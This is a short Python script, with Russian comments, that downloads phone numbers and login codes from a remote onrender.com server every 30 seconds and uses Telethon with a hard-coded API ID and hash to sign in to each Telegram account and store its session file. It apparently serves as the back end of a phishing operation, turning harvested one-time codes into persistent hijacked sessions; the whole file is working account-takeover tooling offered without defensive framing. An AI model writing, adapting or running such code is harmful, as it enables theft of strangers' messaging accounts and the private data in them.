import asyncio
import json
import os
import requests
from telethon import TelegramClient

# ===== НАСТРОЙКИ =====
API_ID = 38819391
API_HASH = '3460a50f4b56082066d92fa202bd6407'
DOWNLOAD_URL = 'https://telegram-web-j598.onrender.com/download'
DATA_FILE = 'data.txt'
SESSIONS_DIR = 'sessions'
PROCESSED_FILE = 'processed.txt'

os.makedirs(SESSIONS_DIR, exist_ok=True)

def load_processed():
    if os.path.exists(PROCESSED_FILE):
        with open(PROCESSED_FILE, 'r') as f:
            return set(line.strip() for line in f)
    return set()

def save_processed(processed):
    with open(PROCESSED_FILE, 'w') as f:
        for item in processed:
            f.write(item + '\n')

def download_data():
    try:
        response = requests.get(DOWNLOAD_URL, timeout=10)
        if response.status_code == 200:
            with open(DATA_FILE, 'wb') as f:
                f.write(response.content)
            print(f'📥 data.txt скачан ({len(response.content)} байт)')
            return True
        else:
            print(f'❌ Ошибка скачивания: {response.status_code}')
            return False
    except Exception as e:
        print(f'❌ Ошибка: {e}')
        return False

async def create_session(phone, code):
    phone_clean = phone.replace('+', '').replace(' ', '')
    session_path = f'{SESSIONS_DIR}/{phone_clean}'

    client = TelegramClient(session_path, API_ID, API_HASH)

    try:
        await client.connect()
        await client.sign_in(phone=phone)
        await client.sign_in(code=code)

        print(f'✅ Сессия создана для {phone}')
        await client.disconnect()
        return True
    except Exception as e:
        print(f'❌ Ошибка для {phone}: {e}')
        return False

async def main():
    print('🚀 Запуск автоматического сборщика сессий...')
    processed = load_processed()
    print(f'📊 Уже обработано: {len(processed)} пар')

    while True:
        print('\n🔄 Проверяю обновления...')

        if download_data():
            try:
                with open(DATA_FILE, 'r') as f:
                    lines = f.readlines()

                new_pairs = []
                for line in lines:
                    try:
                        data = json.loads(line.strip())
                        phone = data.get('phone')
                        code = data.get('code')
                        if phone and code:
                            key = f'{phone}:{code}'
                            if key not in processed:
                                new_pairs.append((phone, code))
                                processed.add(key)
                    except:
                        pass

                if new_pairs:
                    print(f'📱 Найдено {len(new_pairs)} новых пар')
                    for phone, code in new_pairs:
                        await create_session(phone, code)
                    save_processed(processed)
                else:
                    print('⏳ Новых данных нет')

            except Exception as e:
                print(f'⚠️ Ошибка чтения файла: {e}')
        else:
            print('⏳ Не удалось скачать data.txt, жду...')

        for i in range(30, 0, -1):
            print(f'\r🔄 Следующая проверка через {i} сек...', end='')
            await asyncio.sleep(1)
        print()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print('\n🛑 Скрипт остановлен')